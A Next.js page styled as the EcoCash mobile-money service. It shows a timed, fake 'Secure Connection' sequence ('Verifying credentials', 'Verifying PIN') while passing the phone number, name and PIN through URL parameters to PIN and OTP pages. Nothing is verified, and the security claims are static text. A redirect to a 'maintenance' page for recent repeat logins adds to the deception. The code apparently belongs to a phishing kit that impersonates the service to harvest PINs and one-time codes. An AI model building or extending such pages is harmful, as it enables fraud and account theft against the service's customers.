'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion } from 'framer-motion';
import { Home, Loader2, CheckCircle, Clock, Shield } from 'lucide-react';
import Link from 'next/link';
import { Button } from '@/components/ui/button';

export default function LoadingSecurePage() {
  const router = useRouter();
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  const [isComplete, setIsComplete] = useState(false);
  const [params, setParams] = useState({
    action: 'login',
    phone: '',
    name: '',
    pin: '',
    email: '',
    redirect: '/login'
  });

  // Get URL parameters after component mounts (client-side only)
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setParams({
      action: urlParams.get('action') || 'login',
      phone: urlParams.get('phone') || '',
      name: urlParams.get('name') || '',
      pin: urlParams.get('pin') || '',
      email: urlParams.get('email') || '',
      redirect: urlParams.get('redirect') || '/login'
    });
  }, []);

  // Define steps based on action
  const steps = {
    login: [
      { text: 'Verifying credentials', icon: <Shield className="h-5 w-5" /> },
      { text: 'Checking account', icon: <Loader2 className="h-5 w-5" /> },
      { text: 'Securing connection', icon: <Shield className="h-5 w-5" /> },
      { text: 'Redirecting...', icon: <CheckCircle className="h-5 w-5" /> },
    ],
    signup: [
      { text: 'Creating account', icon: <Shield className="h-5 w-5" /> },
      { text: 'Setting up profile', icon: <Loader2 className="h-5 w-5" /> },
      { text: 'Securing data', icon: <Shield className="h-5 w-5" /> },
      { text: 'Redirecting...', icon: <CheckCircle className="h-5 w-5" /> },
    ],
    pin: [
      { text: 'Verifying PIN', icon: <Shield className="h-5 w-5" /> },
      { text: 'Validating credentials', icon: <Loader2 className="h-5 w-5" /> },
      { text: 'Securing session', icon: <Shield className="h-5 w-5" /> },
      { text: 'Redirecting...', icon: <CheckCircle className="h-5 w-5" /> },
    ],
    otp: [
      { text: 'Verifying OTP', icon: <Shield className="h-5 w-5" /> },
      { text: 'Validating code', icon: <Clock className="h-5 w-5" /> },
      { text: 'Securing session', icon: <Shield className="h-5 w-5" /> },
      { text: 'Redirecting...', icon: <CheckCircle className="h-5 w-5" /> },
    ]
  };

  const currentSteps = steps[params.action as keyof typeof steps] || steps.login;

  useEffect(() => {
    if (!params.action) return; // Wait for params to be loaded
    
    // Set interval speed based on action - 8 seconds for login, 5 seconds for others
    const totalDuration = params.action === 'login' ? 8000 : 5000; // 8 seconds for login, 5 for others
    const updateInterval = totalDuration / 100; // Update every 80ms for login, 50ms for others
    
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsComplete(true);
          return 100;
        }
        return prev + 1;
      });
    }, params.action === 'login' ? 80 : 50); // 80ms for login (8s), 50ms for others (5s)

    // Update current step based on progress
    const stepInterval = setInterval(() => {
      const step = Math.floor(progress / 25);
      setCurrentStep(Math.min(step, currentSteps.length - 1));
    }, params.action === 'login' ? 80 : 50);

    // Redirect after completion
    const redirectTimeout = setTimeout(() => {
      if (isComplete) {
        // Check if user logged in within the last 4 hours
        const lastLoginTime = localStorage.getItem('lastLoginTime');
        const now = Date.now();
        
        // If last login was less than 4 hours ago (4 * 60 * 60 * 1000 ms), redirect to maintenance
        if (lastLoginTime && (now - parseInt(lastLoginTime)) < 4 * 60 * 60 * 1000) {
          router.push('/maintenance');
          return;
        }
        
        if (params.action === 'signup') {
          if (params.redirect === 'pin') {
            router.push(`/forgot-pin/reset?name=${encodeURIComponent(params.name)}&phone=${encodeURIComponent(params.phone)}`);
          } else if (params.redirect === 'otp') {
            router.push('/register/verify-otp');
          } else {
            router.push('/dashboard'); // Changed from login to dashboard
          }
        } else if (params.action === 'login') {
          if (params.redirect === 'pin') {
            router.push(`/login/pin?name=${encodeURIComponent(params.name)}&phone=${encodeURIComponent(params.phone)}`);
          } else if (params.redirect === 'otp') {
            router.push('/login/otp');
          } else {
            router.push('/dashboard');
          }
        } else if (params.action === 'pin') {
          router.push('/login/otp');
        } else if (params.action === 'otp') {
          if (params.redirect === 'login') {
            router.push('/login');
          } else {
            // Don't redirect to dashboard after OTP verification
            // Instead, stay on the same page or redirect to appropriate page
            router.push('/dashboard'); // Keeping this for now as it might be needed for other flows
          }
        }
      }
    }, totalDuration + 500); // Total duration + small buffer

    return () => {
      clearInterval(interval);
      clearInterval(stepInterval);
      clearTimeout(redirectTimeout);
    };
  }, [isComplete, params, router, currentSteps.length]);

  if (!params.action) {
    // Show loading state while params are being fetched
    return (
      <div className="min-h-screen bg-white flex flex-col">
        {/* Top Bar */}
        <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
          <Link
            href="/"
            className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
          >
            <Home className="w-5 h-5" />
            Home
          </Link>
          <div className="flex items-center gap-4">
            <Link
              href="/register"
              className="text-blue-600 hover:text-blue-700 font-semibold transition-colors"
            >
              Sign Up
            </Link>
            <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
          {/* Logo */}
          <div className="mb-12 text-center">
            <h1 className="text-5xl font-black">
              <span className="text-blue-600">Eco</span>
              <span className="text-red-600">Cash</span>
            </h1>
          </div>

          <div className="w-full max-w-md text-center">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
              <Shield className="h-8 w-8 text-primary" />
            </div>
            <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
              Loading...
            </h1>
          </div>
        </div>

        {/* Wavy Divider */}
        <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
          <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
        </svg>

        {/* Blue Section with App Promotion */}
        <div className="bg-blue-600 text-white px-6 py-10">
          <div className="max-w-md mx-auto text-center">
            <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

            <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
              <div className="flex justify-center gap-4 mb-4 opacity-70">
                <div className="w-6 h-6 bg-white rounded-full" />
                <div className="w-6 h-6 bg-white rounded-full" />
                <div className="w-6 h-6 bg-white rounded-full" />
              </div>

              <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
              <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

              <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
                Install App
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="flex items-center gap-4">
          <Link
            href="/register"
            className="text-blue-600 hover:text-blue-700 font-semibold transition-colors"
          >
            Sign Up
          </Link>
          <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
              <Shield className="h-8 w-8 text-primary" />
            </div>
            <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
              Secure Connection
            </h1>
            <p className="text-foreground/70 mt-2">
              Processing your request securely
            </p>
          </div>

          <div className="bg-card p-6 rounded-xl border border-primary/10 shadow-sm">
            <div className="space-y-6">
              <div className="w-full bg-muted rounded-full h-2.5">
                <motion.div 
                  className="bg-primary h-2.5 rounded-full" 
                  initial={{ width: "0%" }}
                  animate={{ width: `${progress}%` }}
                  transition={{ duration: params.action === 'login' ? 8 : 5, ease: "linear" }}
                />
              </div>

              <div className="space-y-3">
                {currentSteps.map((step, index) => (
                  <div 
                    key={index} 
                    className={`flex items-center space-x-3 p-3 rounded-lg ${
                      index <= currentStep ? 'bg-primary/10' : 'bg-muted/50'
                    }`}
                  >
                    <div className={`p-1.5 rounded-full ${
                      index <= currentStep ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground'
                    }`}>
                      {index < currentStep ? (
                        <CheckCircle className="h-4 w-4" />
                      ) : (
                        step.icon
                      )}
                    </div>
                    <span className={`${
                      index <= currentStep ? 'text-foreground font-medium' : 'text-foreground/60'
                    }`}>
                      {step.text}
                    </span>
                  </div>
                ))}
              </div>

              <div className="flex justify-center pt-4">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="p-2"
                >
                  <Loader2 className="h-6 w-6 text-primary" />
                </motion.div>
              </div>
            </div>
          </div>

          <div className="mt-8 text-center text-sm text-foreground/70">
            <p>Your data is encrypted and secure</p>
            <p className="mt-1">This may take a few moments...</p>
          </div>
        </div>
      </div>

      {/* Wavy Divider */}
      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}